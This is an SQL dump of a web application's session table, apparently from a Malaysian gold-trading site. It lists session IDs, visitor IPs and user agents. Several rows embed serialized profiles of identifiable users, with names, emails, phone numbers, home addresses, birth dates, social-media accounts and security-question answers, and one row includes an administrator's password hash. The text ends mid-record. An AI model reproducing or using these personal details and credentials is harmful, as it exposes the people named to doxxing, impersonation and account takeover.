('1a21dc601f1c6929fb110ea29727cc8b', '183.171.25.175', 'Mozilla/5.0 (Linux; Android 5.0; SM-G900F Build/LR', 1461766197, 'a:52:{s:5:"me_id";s:2:"47";s:8:"me_image";s:15:"default-img.jpg";s:12:"me_firstname";s:9:"Azhar9751";s:11:"me_lastname";s:9:"Azhar9751";s:11:"me_username";s:9:"Azhar9751";s:11:"me_question";s:20:"What is my username?";s:9:"me_answer";s:9:"Azhar9751";s:14:"me_unique_link";s:32:"033ed15796968126a1ef11da142912a6";s:11:"me_address1";N;s:8:"me_city1";N;s:9:"me_state1";N;s:12:"me_postcode1";N;s:11:"me_country1";N;s:11:"me_address2";N;s:8:"me_city2";N;s:9:"me_state2";N;s:12:"me_postcode2";N;s:11:"me_country2";N;s:22:"me_government_issue_id";N;s:17:"me_driver_license";N;s:11:"me_phone_no";N;s:13:"me_birth_date";N;s:14:"me_description";N;s:14:"me_maiden_name";N;s:14:"me_nationality";N;s:11:"me_facebook";N;s:10:"me_twitter";N;s:12:"me_instagram";N;s:13:"me_googleplus";N;s:14:"me_whatsapp_no";N;s:11:"me_telegram";N;s:9:"me_wechat";N;s:8:"me_email";s:20:"azhar29066@gmail.com";s:16:"me_register_date";s:19:"2016-04-26 21:01:27";s:15:"me_account_type";s:1:"1";s:20:"me_activation_status";s:1:"2";s:13:"me_last_login";s:25:"2016-04-26T21:10:53+08:00";s:12:"me_magic_num";s:32:"9a5749634c226c2629c9d3e3d217bb2f";s:5:"ml_id";s:1:"3";s:9:"me_status";s:1:"1";s:10:"me_company";N;s:10:"me_reg_num";N;s:15:"me_company_doc1";N;s:22:"me_company_doc1_verify";s:1:"1";s:15:"me_company_doc2";N;s:22:"me_company_doc2_verify";s:1:"1";s:7:"me_type";s:2:"NU";s:5:"sl_id";s:1:"0";s:4:"g_id";s:1:"0";s:10:"me_is_amil";s:2:"no";s:9:"logged_in";b:1;s:12:"me_id_parent";s:8:"ATQBNg==";}'),
('1a79396b35c956d05e17900ed05ccf6c', '1.9.209.50', 'Mozilla/5.0 (Linux; Android 5.0.2; vivo Y51 Build/', 1461117345, ''),
('1a7abde58448f7f7655b011ec72d3011', '134.249.55.100', 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.2;', 1461188450, ''),
('1a8709dc0e34a4d3775b7f860e5b4e33', '66.249.69.222', 'Mozilla/5.0 (compatible; Googlebot/2.1; +http://ww', 1461415269, ''),
('1a8da7ac38477de775998d01922a25d7', '71.6.135.131', '0', 1461637560, ''),
('1a972265a6f653330b87228269d8df38', '180.76.15.10', 'Mozilla/5.0 (compatible; Baiduspider/2.0; +http://', 1461620795, ''),
('1a9c858c2d035396a09d8afa04aebd8d', '115.164.93.145', 'Mozilla/5.0 (Linux; Android 4.4.2; ASUS_T00Q Build', 1461420805, 'a:1:{s:15:"flash:old:error";s:110:"Password validation failure ( your choise is weak ) <br /><br />Password must include at least one CAPS!<br />";}'),
('1ab7fdc25bee226208483c8ab14024c4', '13.92.241.115', 'semanticbot', 1461739132, ''),
('1af1bdb9d6c49368978a3a31d2fe9004', '130.193.51.80', 'Mozilla/5.0 (compatible; YandexBot/3.0; +http://ya', 1461727665, ''),
('1afeb934f6c2ea91171ae8f76263caa4', '180.76.15.142', 'Mozilla/5.0 (compatible; Baiduspider/2.0; +http://', 1461859645, ''),
('1b16c1542f19e771086d881cc538aaa6', '118.100.90.197', 'Mozilla/5.0 (Linux; U; Android 4.3; en-us; R8006 B', 1461489803, 'a:1:{s:12:"me_id_parent";s:88:"XjQwiN-yQ1Swfmu5jXvkAKRyGz9ZwWk_Ud0AdR_Fzg4IKxSzsMBAZbBjfyn5iUqzkFdGkfOgrR8FdLng21AI5A==";}'),
('1b2710343f5ef7db3055bc4ed56c7a17', '113.210.54.93', 'WhatsApp/2.16.13 A', 1461232011, ''),
('1b55bb9897658bbb547468edf71175b5', '45.55.229.99', 'Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1;', 1461718313, ''),
('1b87c23eae5d88be31d1ca792a389703', '113.210.62.149', 'Mozilla/5.0 (iPhone; CPU iPhone OS 9_3_1 like Mac ', 1461640664, ''),
('1bcacb8bc414d88cc96dc02323876007', '173.88.152.61', 'Mozilla/4.0 (compatible; MSIE 5.5; Windows 98)', 1461909750, ''),
('1bd0b796cea05d216573a4e451e861fd', '77.75.78.160', 'Mozilla/5.0 (compatible; SeznamBot/3.2; +http://fu', 1461525670, ''),
('1bdb6bf769cb4b302a7be0385b522b33', '180.76.15.19', 'Mozilla/5.0 (compatible; Baiduspider/2.0; +http://', 1461592196, ''),
('1c348da899398f6b4f476da796a889ac', '180.76.15.146', 'Mozilla/5.0 (compatible; Baiduspider/2.0; +http://', 1461246588, ''),
('1c8dbd88bf52c7509a265b225509e6ff', '134.249.55.100', 'Mozilla/6.0 (compatible; MSIE 7.0a1; Windows NT 5.', 1461690038, ''),
('1ca063939e80dce9f59c4bff2a4a49bd', '77.75.78.161', 'Mozilla/5.0 (compatible; SeznamBot/3.2; +http://fu', 1461595955, ''),
('1cc9aab9578fa3680b2593f1de0107e8', '0.0.0.0', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_5) Ap', 1461040918, 'a:50:{s:5:"me_id";s:1:"3";s:8:"me_image";s:42:"6d3ac-adeq-nur---ftmk!-20150212_151603.jpg";s:12:"me_firstname";s:9:"Nur Umira";s:11:"me_lastname";s:7:"Mustafa";s:11:"me_username";s:3:"nur";s:11:"me_question";s:20:"What is my username?";s:9:"me_answer";s:3:"nur";s:14:"me_unique_link";s:32:"b55178b011bfb206965f2638d0f87047";s:11:"me_address1";s:44:"J-1-14, BLOK J, PANGSAPURI TTU3, JALAN TU61.";s:8:"me_city1";s:10:"AYER KEROH";s:9:"me_state1";s:6:"MELAKA";s:12:"me_postcode1";s:5:"75450";s:11:"me_country1";s:8:"MALAYSIA";s:11:"me_address2";s:28:"91, JALAN KERAI, SG. RETANG.";s:8:"me_city2";s:8:"JERANTUT";s:9:"me_state2";s:6:"PAHANG";s:12:"me_postcode2";s:5:"27000";s:11:"me_country2";s:8:"MALAYSIA";s:22:"me_government_issue_id";N;s:17:"me_driver_license";N;s:11:"me_phone_no";s:10:"0136420142";s:13:"me_birth_date";s:10:"1993-05-18";s:14:"me_description";N;s:14:"me_maiden_name";N;s:14:"me_nationality";N;s:11:"me_facebook";s:33:"https://www.facebook.com/nurumira";s:10:"me_twitter";s:28:"https://twitter.com/nurumira";s:12:"me_instagram";s:29:"http://instagram.com/nurumira";s:13:"me_googleplus";s:30:"http://googleplus.com/nurumira";s:14:"me_whatsapp_no";s:10:"0199737579";s:11:"me_telegram";s:1:"-";s:9:"me_wechat";s:1:"-";s:8:"me_email";s:18:"nurumira@gmail.com";s:16:"me_register_date";s:19:"2015-04-27 03:12:49";s:15:"me_account_type";s:1:"1";s:20:"me_activation_status";s:1:"2";s:13:"me_last_login";s:25:"2016-04-12T17:37:02+02:00";s:12:"me_magic_num";s:32:"69c0e639c71a34bb6b710f043138f7f8";s:5:"ml_id";s:1:"3";s:9:"me_status";s:1:"1";s:10:"me_company";s:0:"";s:10:"me_reg_num";s:0:"";s:15:"me_company_doc1";s:0:"";s:22:"me_company_doc1_verify";s:1:"1";s:15:"me_company_doc2";s:0:"";s:22:"me_company_doc2_verify";s:1:"1";s:7:"me_type";s:2:"NU";s:5:"sl_id";s:1:"0";s:4:"g_id";s:1:"2";s:9:"logged_in";b:1;}'),
('1cd315dda2222fb70a6cc99982007935', '109.236.94.216', 'python-requests/2.9.1', 1461234989, ''),
('1cf8927f46693c8db9fe07250749833b', '176.212.198.255', 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/53', 1461405034, ''),
('1d22f00e51e75c72319fcc51f2c57f72', '54.242.1.135', 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;', 1461669975, ''),
('1d48ca86532e3be9117489948738fa9f', '207.46.13.19', 'Mozilla/5.0 (compatible; bingbot/2.0; +http://www.', 1461181400, ''),
('1de847fa0fb38fe8de310caa3e57094e', '208.115.111.74', 'Mozilla/5.0 (compatible; DotBot/1.1; http://www.op', 1461607203, ''),
('1e09349247f3e7c0aff8ecad9733a6b9', '180.76.15.13', 'Mozilla/5.0 (compatible; Baiduspider/2.0; +http://', 1461799775, ''),
('1e6f01d380c3656e81ed05bf2989ef84', '40.77.167.84', 'Mozilla/5.0 (compatible; bingbot/2.0; +http://www.', 1461535099, ''),
('1eaeb5b465d5fe1b5f614e4e666947d5', '40.77.167.93', 'Mozilla/5.0 (compatible; bingbot/2.0; +http://www.', 1461133097, ''),
('1eb2387169ab187502f28799452961e7', '173.252.90.238', 'facebookexternalhit/1.1 (+http://www.facebook.com/', 1461429513, ''),
('1edfee877f21829d59a418d85f4b8039', '1.9.100.109', 'Mozilla/5.0 (Linux; Android 4.1.2; GT-I8262 Build/', 1461126606, 'a:1:{s:12:"me_id_parent";s:88:"TJqelvsGdE085R4oanCdsDapwEy-DboHTvpY7F83TO8RVbI5Iqv0WuzPIF3FSmhk38MhS1AymvgotAw673WtFw==";}'),
('1ef13a6fcf69a8773e3e62a3e7a516c0', '180.76.15.5', 'Mozilla/5.0 (compatible; Baiduspider/2.0; +http://', 1461587807, ''),
('1f2aa3f64b98a5b27c30c6224b845d97', '113.210.62.149', 'Mozilla/5.0 (iPhone; CPU iPhone OS 9_3_1 like Mac ', 1461640664, ''),
('1fd535bb244fe1571115daf2ab7b07b9', '103.1.71.178', 'WhatsApp/2.16.13 A', 1461232765, ''),
('203fe6ca6268e528a1ce3414a7447ae3', '66.249.66.36', 'Mozilla/5.0 (compatible; Googlebot/2.1; +http://ww', 1461896621, ''),
('2045b10e9300196a151f1360116a7270', '66.249.69.52', 'Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/', 1461733087, ''),
('20621e1409396f74610bd18ba708cdf8', '180.76.15.147', 'Mozilla/5.0 (compatible; Baiduspider/2.0; +http://', 1461936113, ''),
('208e9d4a611abee59241fa29ea4253ea', '5.102.173.71', 'Mozilla/5.0 (compatible; MojeekBot/0.6; +https://w', 1461776480, ''),
('20ae56a0a7cc446ff3f0dbcbdd669be6', '207.46.13.33', 'Mozilla/5.0 (compatible; bingbot/2.0; +http://www.', 1461489249, ''),
('20b804b84cf8749f4d507963c5114516', '77.75.79.101', 'Mozilla/5.0 (compatible; SeznamBot/3.2; +http://fu', 1461467774, ''),
('20bd8ed243dcdb62be83efc363b96986', '113.210.60.46', 'Mozilla/5.0 (X11; Linux x86_64; rv:10.0) Gecko/201', 1461429402, ''),
('20d650059d3e5fbf313463abca0b7cbc', '175.141.171.212', 'WhatsApp/2.12.15/i', 1461102521, 'a:1:{s:12:"me_id_parent";s:88:"uw-PP7jguedS0LceHjLJxM_hDB6WLa8IE6Cf42zBtrX1-cRa52lK1Zyeb8ErQdxr8ee1F3HwLHXoARngW5TjOg==";}'),
('20de2861a2f5d867c241585fda73d5a1', '66.249.69.10', 'Mozilla/5.0 (compatible; Googlebot/2.1; +http://ww', 1461497851, ''),
('2127f1073e4f38433ae5178ba0bc930a', '178.137.90.202', 'Opera/9.00 (Windows NT 5.1; U; ru)', 1461430288, ''),
('2128005cd4a0d11152741cf2f55ff757', '51.254.32.77', 'Mozilla/5.0 (compatible; MJ12bot/v1.4.5; http://ww', 1461758743, ''),
('2199243a5332c717f3f982f9e0fd9d3a', '157.55.39.159', 'Mozilla/5.0 (compatible; bingbot/2.0; +http://www.', 1461800061, ''),
('222904946e92ee33b83258789e7d3a77', '66.249.69.227', 'Mozilla/5.0 (compatible; Googlebot/2.1; +http://ww', 1461517330, ''),
('22a0171380e4e7991241956bda766d62', '60.169.79.233', '0', 1461176959, ''),
('22f5e395f4df7cad836f61b0e83eb2d0', '13.92.241.115', 'semanticbot', 1461739119, ''),
('230977dd53941db3bd167bef862729a4', '180.76.15.19', 'Mozilla/5.0 (compatible; Baiduspider/2.0; +http://', 1461702314, ''),
('23247789cd314db1c55b85f0e646e554', '45.33.36.127', 'Mozilla/5.0 (compatible; Uptimebot/1.0; +http://ww', 1461903474, ''),
('232f662abfa25741df1785fce308acd0', '180.76.15.6', 'Mozilla/5.0 (compatible; Baiduspider/2.0; +http://', 1461537897, ''),
('2361b3e1db9c30055a68b4a29737c0eb', '180.76.15.158', 'Mozilla/5.0 (compatible; Baiduspider/2.0; +http://', 1461149016, ''),
('23a4a42a4dc8e07843e17942d72d44e5', '13.92.241.115', 'semanticbot', 1461739137, ''),
('23b6200d7e6ba7e9a1a6cedc57654830', '66.249.66.37', 'Mozilla/5.0 (compatible; Googlebot/2.1; +http://ww', 1461863840, ''),
('23bc7fbf592e8575664c072fc1aeae78', '157.55.39.245', 'Mozilla/5.0 (compatible; bingbot/2.0; +http://www.', 1461306140, '');
INSERT INTO `ci_sessions` (`session_id`, `ip_address`, `user_agent`, `last_activity`, `user_data`) VALUES
('23bd7b0adca067772ed8545189392a8a', '180.76.15.31', 'Mozilla/5.0 (compatible; Baiduspider/2.0; +http://', 1461166775, ''),
('23c087f9d0be18a37c461532044032d3', '180.76.15.157', 'Mozilla/5.0 (compatible; Baiduspider/2.0; +http://', 1461469305, ''),
('23c7859952df5a86cc30922275d7f8e4', '46.118.156.3', 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.2;', 1461641913, ''),
('23e36833f4c33b7eb5a1a4192a75e941', '180.76.15.12', 'Mozilla/5.0 (compatible; Baiduspider/2.0; +http://', 1461655342, ''),
('23eb39fb21c3aa374b81f1553296b324', '180.76.15.154', 'Mozilla/5.0 (compatible; Baiduspider/2.0; +http://', 1461845845, ''),
('23ef9fd89cdf240d7bbdb79a9020f5df', '115.164.82.86', 'Mozilla/5.0 (iPhone; CPU iPhone OS 9_2_1 like Mac ', 1461417085, ''),
('240c4ca0e7b5ba0be4079c9cd2d41f07', '208.67.172.36', 'Mozilla/5.0 (X11; U; Linux x86_64;en-US;rv:1.9.2.1', 1461737543, ''),
('243d8a82b4f2037e22b1453a7bf7d520', '180.76.15.21', 'Mozilla/5.0 (compatible; Baiduspider/2.0; +http://', 1461918326, ''),
('244c87bc20076e0937ab679f6db8bd3c', '180.76.15.10', 'Mozilla/5.0 (compatible; Baiduspider/2.0; +http://', 1461131647, ''),
('2467171d9cc680050084f3b9abe11781', '40.77.167.93', 'Mozilla/5.0 (compatible; bingbot/2.0; +http://www.', 1461135627, ''),
('247cdff53889b894a2d501fc2cc1bc23', '208.67.172.36', 'Mozilla/5.0 (X11; U; Linux x86_64;en-US;rv:1.9.2.1', 1461736054, ''),
('24921116ee1f4015bcc8dad72c0fdc46', '175.139.86.43', 'WhatsApp/2.16.2/i', 1461742563, 'a:1:{s:12:"me_id_parent";s:8:"Cz8MPA==";}'),
('249f4063628a8c4ad8729411b5966f99', '69.30.213.138', 'Mozilla/5.0 (compatible; MJ12bot/v1.4.5; http://ww', 1461779717, ''),
('24bf529d089e5602dd1e87bb38757b4c', '113.210.61.213', 'Mozilla/5.0 (Linux; Android 5.0; SM-N9005 Build/LR', 1461420799, 'a:1:{s:12:"me_id_parent";s:1:"1";}'),
('24da90d7bc0762c853660ca96df4358d', '149.154.167.162', 'TelegramBot (like TwitterBot)', 1461164497, ''),
('24e1187619e62050fcd440d165cd2ce1', '5.9.83.211', 'Mozilla/5.0 (compatible; MegaIndex.ru/2.0; +http:/', 1461160559, ''),
('24eb76e5b4b56a697edbe85b018844b6', '162.210.196.98', 'Mozilla/5.0 (compatible; MJ12bot/v1.4.5; http://ww', 1461921110, ''),
('24fd83b41013d1830df82c8aac4a4731', '13.92.241.115', 'semanticbot', 1461739113, ''),
('250aecfdb1dab6667e2a01dc3f824b0b', '180.76.15.29', 'Mozilla/5.0 (compatible; Baiduspider/2.0; +http://', 1461784931, ''),
('25213bcf1fb058802f1fe5274e736414', '178.137.90.202', 'Mozilla/4.0 (compatible; MSIE 6.0; America Online ', 1461487073, ''),
('256a458050c7e55f88ae9433f3bfa5b4', '210.48.221.10', 'Mozilla/5.0 (X11; Linux x86_64; rv:10.0) Gecko/201', 1461767899, ''),
('256d1ffa815e7daf05de092e13d139bf', '164.132.161.38', 'Mozilla/5.0 (compatible; AhrefsBot/5.1; +http://ah', 1461616661, ''),
('258ecc0e5d5c6b842d9b5a4d9042e459', '46.118.156.3', 'Mozilla/4.0 (compatible; MSIE 7.0b; Windows NT 6.0', 1461856331, ''),
('25b98fb44e21ec5e511f251e0d9a1d9f', '123.136.106.98', 'Mozilla/5.0 (Linux; U; Android 4.2.2; en-gb; GT-I9', 1461500051, 'a:1:{s:12:"me_id_parent";s:88:"DEbJkFKnjmre8B06Vry03KnXv6M54Si_kU1id7qE3rXZU35-FaIc8nwZYs_IUKbbzdds70C4wrMKoRN37wBpTQ==";}'),
('25c66180d08f4a9d6573fa0562c77c0a', '5.9.83.211', 'Mozilla/5.0 (compatible; MegaIndex.ru/2.0; +http:/', 1461160562, ''),
('25c8cb38d460aae743d740d9eb06cc73', '134.249.55.100', 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;', 1461436799, ''),
('25e31f17de9bda3344245109e5f51f5e', '178.137.90.202', 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;', 1461244598, ''),
('25fde209e8276c26715e2189cefb547c', '188.138.33.173', 'libwww-perl/6.15', 1461408645, ''),
('2619b4c89fcef0636617f486bdb74c90', '66.249.66.33', 'Mozilla/5.0 (compatible; Googlebot/2.1; +http://ww', 1461910449, ''),
('2620d30a58140f89716596a137e9772f', '103.1.71.206', 'Mozilla/5.0 (Linux; Android 4.4.2; GT-N7100 Build/', 1461487726, ''),
('26464b2be00a57a9ccb992919856d5e9', '13.92.241.115', 'semanticbot', 1461739108, ''),
('269eb93bcef13f6c66a4ff81ea31dce7', '103.1.71.185', 'Mozilla/5.0 (Linux; Android 4.4.4; vivo X5 Build/K', 1461412771, 'a:1:{s:12:"me_id_parent";s:88:"qduni-te6rsogy_18oN_A79BVScTYfUIO8Ojc0q0LVe9rUkYzR1cgtkXTQnTJMsTyGUHWu8kIKgsL4uB8NtSDw==";}'),
('26b22bb46f50c3156a7792d69cddc576', '78.46.50.246', 'Mozilla/5.0 (compatible; MJ12bot/v1.4.5; http://ww', 1461898651, ''),
('26ba1c3b50b359a91d93dcf5df1ae3fa', '178.137.90.202', 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;', 1461676615, ''),
('274abfda6bf23c521f8a960aba400bf5', '180.76.15.11', 'Mozilla/5.0 (compatible; Baiduspider/2.0; +http://', 1461924853, ''),
('27936675707918b3d6703f9c520263f2', '144.76.29.66', 'Mozilla/5.0 (compatible; MJ12bot/v1.4.5; http://ww', 1461937378, ''),
('27d27818dd1daa499a01f1ddb5f2de98', '66.249.64.96', 'Mozilla/5.0 (compatible; Googlebot/2.1; +http://ww', 1461818111, ''),
('27f9eeefedfd8b23e529335c516b0728', '66.249.66.58', 'Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/', 1461286252, ''),
('282119595634a6d53c22c30292b653ba', '69.171.228.118', 'facebookexternalhit/1.1', 1461421907, 'a:1:{s:12:"me_id_parent";s:88:"8UvtgVN28Q8AtVnth9tVWCzvaqldOA9NdBYeCokTX6kZnccyAUshEShT9jgcZEZSJ0zfDxlEMEPUDj1JEMf5lw==";}'),
('282e7753413f719cfdd90c9704ccca23', '211.24.232.114', 'Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (K', 1461654879, ''),
('283c24bd3b6c3b4a36f926bc96c0e4a7', '115.164.82.86', 'Mozilla/5.0 (iPhone; CPU iPhone OS 9_2_1 like Mac ', 1461420760, 'a:1:{s:12:"me_id_parent";s:1:"1";}'),
('2844c8e2997cabdc3993e78812aa03ff', '180.76.15.155', 'Mozilla/5.0 (compatible; Baiduspider/2.0; +http://', 1461759472, ''),
('286bc29d965bf98ec643629d8d73e350', '175.139.86.43', 'WhatsApp/2.16.2/i', 1461744738, 'a:1:{s:12:"me_id_parent";s:8:"VmILOw==";}'),
('28c3465880c534eeea74e29668a68d4e', '69.30.210.242', 'Mozilla/5.0 (compatible; MJ12bot/v1.4.5; http://ww', 1461747466, ''),
('28d431bef09bf9d71750c83a7c97850e', '180.76.15.34', 'Mozilla/5.0 (compatible; Baiduspider/2.0; +http://', 1461559571, ''),
('28da4b122ff7db9f8fbc826d424881ef', '180.76.15.156', 'Mozilla/5.0 (compatible; Baiduspider/2.0; +http://', 1461802468, ''),
('28f742f51d5775e83bb9335028dbdba0', '115.164.50.83', 'Mozilla/5.0 (iPhone; CPU iPhone OS 9_3_1 like Mac ', 1461404551, 'a:1:{s:16:"flash:old:sucess";s:40:"Activation is successful, please log in!";}'),
('295c59acc2982a0d4a7e0bdfb69d50a8', '134.249.55.100', 'Mozilla/6.0 (compatible; MSIE 7.0a1; Windows NT 5.', 1461690036, ''),
('29837aa2ad31d0a98edb89738681b909', '180.76.15.148', 'Mozilla/5.0 (compatible; Baiduspider/2.0; +http://', 1461490767, ''),
('29af07903bb436f37088f0ba72aefd60', '113.210.57.165', 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/53', 1461420773, ''),
('29de31f7aa04408af07ca0ea2adc179e', '66.249.69.116', 'Mozilla/5.0 (compatible; Googlebot/2.1; +http://ww', 1461604483, ''),
('2a2b067b92e642fe510f6bc036ab3ecf', '180.76.15.25', 'Mozilla/5.0 (compatible; Baiduspider/2.0; +http://', 1461555646, ''),
('2a3ec4ebecfc5b70547f3b66ed622388', '183.171.29.191', 'Mozilla/5.0 (Linux; U; Android 4.4.2; en-gb; GT-N7', 1461411779, 'a:1:{s:12:"me_id_parent";s:88:"2Pq9X0EfrxalOeGp5MDKnBE51Qalf68edlBuT0jNw7Om4vpen4btXCQCX0U6XJWxHHXe9-4TRSoRiB2CAVPHng==";}'),
('2a4a4924f78c4f1783fec7a96229c773', '123.125.71.85', 'Mozilla/5.0 (compatible; Baiduspider/2.0; +http://', 1461599616, ''),
('2a4d83df09c75394646ee45207a7dc2e', '180.76.15.21', 'Mozilla/5.0 (compatible; Baiduspider/2.0; +http://', 1461177259, ''),
('2a6b8073143d9cb365d42e85275d04b2', '180.76.15.32', 'Mozilla/5.0 (compatible; Baiduspider/2.0; +http://', 1461698629, ''),
('2aa1baca4e5cd77bcf5bf8f5453d2099', '178.137.90.202', 'Opera/9.00 (Windows NT 4.0; U; en)', 1461733896, ''),
('2ab47626ef27ae52649cde4c0828952d', '5.102.173.71', 'Mozilla/5.0 (compatible; MojeekBot/0.6; +https://w', 1461767946, ''),
('2b2bd4f5b61c21b4c8eff9a70153c00c', '45.79.81.142', 'Mozilla/5.0 (compatible; Uptimebot/1.0; +http://ww', 1461476360, ''),
('2b33d37cf72af03f2abd0a040541645a', '210.48.221.10', 'Mozilla/5.0 (X11; Linux x86_64; rv:10.0) Gecko/201', 1461767867, ''),
('2b80a41bb063522df6c361a7d16eeea4', '54.85.5.60', 'DowntimeDetector/1.0 (+http://downforeveryoneorjus', 1461426831, ''),
('2bd9b5af303d31492b2bf16dcee63380', '169.54.233.116', '0', 1461630321, ''),
('2bef3e690fffbe6c44f6ed863a7a659e', '66.249.64.228', 'Mozilla/5.0 (compatible; Googlebot/2.1; +http://ww', 1461803339, ''),
('2c353cc2a5c6ecc92c897fc7b3759a63', '210.48.221.10', 'Mozilla/5.0 (X11; Linux x86_64; rv:10.0) Gecko/201', 1461767207, ''),
('2c65ee6ed350ea4787a1e8a6fb5fcd25', '175.141.171.212', 'Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/53', 1461464889, 'a:53:{s:5:"me_id";s:1:"7";s:8:"me_image";s:15:"default-img.jpg";s:12:"me_firstname";s:5:"arash";s:11:"me_lastname";s:5:"arash";s:11:"me_username";s:5:"arash";s:11:"me_question";s:20:"What is my username?";s:9:"me_answer";s:5:"arash";s:14:"me_unique_link";s:32:"81b9a3538d93a7623ad0e9bf1347d137";s:11:"me_address1";s:0:"";s:8:"me_city1";s:0:"";s:9:"me_state1";s:0:"";s:12:"me_postcode1";s:0:"";s:11:"me_country1";s:0:"";s:11:"me_address2";s:0:"";s:8:"me_city2";s:0:"";s:9:"me_state2";s:0:"";s:12:"me_postcode2";s:0:"";s:11:"me_country2";s:0:"";s:22:"me_government_issue_id";N;s:17:"me_driver_license";N;s:11:"me_phone_no";s:11:"60166707888";s:13:"me_birth_date";s:10:"1977-01-19";s:14:"me_description";N;s:14:"me_maiden_name";N;s:14:"me_nationality";N;s:11:"me_facebook";s:0:"";s:10:"me_twitter";s:0:"";s:12:"me_instagram";s:0:"";s:13:"me_googleplus";s:0:"";s:14:"me_whatsapp_no";s:0:"";s:11:"me_telegram";s:0:"";s:9:"me_wechat";s:0:"";s:8:"me_email";s:22:"arash.private@live.com";s:16:"me_register_date";s:19:"2016-04-23 17:41:44";s:15:"me_account_type";s:1:"1";s:20:"me_activation_status";s:1:"2";s:13:"me_last_login";s:25:"2016-04-24T10:18:37+08:00";s:12:"me_magic_num";s:32:"248dfd4fff3169f86edec2930684bfd4";s:5:"ml_id";s:1:"3";s:9:"me_status";s:1:"1";s:10:"me_company";s:0:"";s:10:"me_reg_num";s:0:"";s:15:"me_company_doc1";s:0:"";s:22:"me_company_doc1_verify";s:1:"1";s:15:"me_company_doc2";s:0:"";s:22:"me_company_doc2_verify";s:1:"1";s:7:"me_type";s:2:"NU";s:5:"sl_id";s:1:"0";s:4:"g_id";s:1:"1";s:9:"logged_in";b:1;s:11:"img_deposit";s:0:"";s:11:"arr_deposit";s:0:"";s:13:"cart_contents";a:3:{s:32:"7fbf7b5b98a675b6980cf1e938a82b0d";a:7:{s:5:"rowid";s:32:"7fbf7b5b98a675b6980cf1e938a82b0d";s:2:"id";s:1:"1";s:3:"qty";s:1:"1";s:5:"price";s:1:"1";s:4:"name";s:1:"-";s:7:"options";a:6:{s:3:"qty";s:1:"1";s:6:"v_name";s:88:"WSjHXKj7u29fbF0ZNkr_6x01pqiLgj2M_JMccynAfjbdUefShTdO18MetGbuSa3-mpdjO3FuebbfN2qoBDhg7w==";s:5:"br_id";s:88:"FN_PcboD25eQczskSgYnkfpHmXglxQbkcK_fcO6At93ZsnF2sf9qoQhadfoEM5W3iZ2IabxXQg_hXqQhkMvGIQ==";s:6:"itc_id";s:88:"tCjTc9HhcUlsSXusVzNN3qaHn2a61KcWpZBYVA6GynqkGpetexs6hnReD6FklQNHRxwWD6a34ZaMz-AUmDLBqw==";s:1:"v";O:8:"stdClass":78:{s:4:"v_id";s:1:"1";s:7:"v_image";s:20:"kopsya1gramdepan.png";s:8:"v_image2";s:23:"kopsya1grambelakang.png";s:8:"v_image3";s:27:"kopsya1gramdepanangkasa.png";s:8:"v_image4";s:0:"";s:8:"v_image5";s:0:"";s:6:"v_name";s:18:"KOPSYA Gold 1 Gram";s:12:"v_price_rate";s:6:"185.00";s:8:"v_weight";s:1:"1";s:6:"v_cert";s:8:"A1010001";s:6:"v_desc";N;s:5:"br_id";s:1:"6";s:6:"itc_id";s:1:"3";s:5:"vt_id";s:1:"3";s:5:"me_id";s:1:"1";s:6:"isc_id";s:1:"1";s:9:"v_regdate";s:19:"0000-00-00 00:00:00";s:7:"br_code";s:6:"KOPSYA";s:7:"br_name";s:6:"KOPSYA";s:8:"itc_name";s:9:"Gold Bars";s:6:"itp_id";s:1:"1";s:5:"it_id";s:1:"1";s:5:"pu_id";s:1:"1";s:9:"itp_price";s:6:"200.00";s:8:"itp_rate";s:1:"1";s:7:"pu_desc";s:3:"999";s:7:"it_name";s:4:"Gold";s:7:"vt_name";s:10:"Vault Keep";s:8:"me_image";s:36:"99271c3805aa830738485064b3707cc9.jpg";s:12:"me_firstname";s:12:"DP System HQ";s:11:"me_lastname";s:8:"Dinarpal";s:11:"me_username";s:4:"dphq";s:11:"me_password";s:60:"$2a$08$R26OP4OtJ2PCewXZLW5ab.DpVPpHZwRtR.Fbfm4qKXTothzh7KkG6";s:11:"me_question";s:22:"What is my pet''s name?";s:9:"me_answer";s:5:"comel";s:14:"me_unique_link";s:200:"http://localhost/dinarpal_v2/member/uniqueLink/http://localhost/dinarpal_v2/member/uniqueLink/http://localhost/dinarpal_v2/member/uniqueLink/http://localhost/dinarpal_v2/member/uniqueLink/http://local";s:11:"me_address1";s:44:"J-1-14, BLOK J, PANGSAPURI TTU3, JALAN TU61.";s:8:"me_city1";s:10:"AYER KEROH";s:9:"me_state1";s:6:"MELAKA";s:12:"me_postcode1";s:5:"75450";s:11:"me_country1";s:8:"MALAYSIA";s:11:"me_address2";s:28:"91, JALAN KERAI, SG. RETANG.";s:8:"me_city2";s:8:"JERANTUT";s:9:"me_state2";s:6:"PAHANG";s:12:"me_postcode2";s:5:"27000";s:11:"me_country2";s:8:"MALAYSIA";s:22:"me_government_issue_id";s:5:"MY001";s:17:"me_driver_license";s:7:"B and D";s:11:"me_phone_no";s:10:"0199737579";s:13:"me_birth_date";s:10:"1989-10-31";s:14:"me_description";s:0:"";s:14:"me_maiden_name";s:4:"Ntoh";s:14:"me_nationality";s:8:"Malaysia";s:11:"me_facebook";s:36:"https://www.facebook.com/kidzeclipes";s:10:"me_twitter";s:31:"https://twitter.com/kidzeclipes";s:12:"me_instagram";s:34:"https://www.instagram.com/umaq_89/";s:13:"me_googleplus";s:55:"https://plus.google.com/u/0/110272712192644641706/posts";s:14:"me_whatsapp_no";s:10:"0199737579";s:11:"me_telegram";s:11:"019-9737579";s:9:"me_wechat";s:15:"+6 019-973 7579";s:8:"me_email";s:21:"kidzeclipes@gmail.com";s:16:"me_register_date";s:19:"2014-11-10 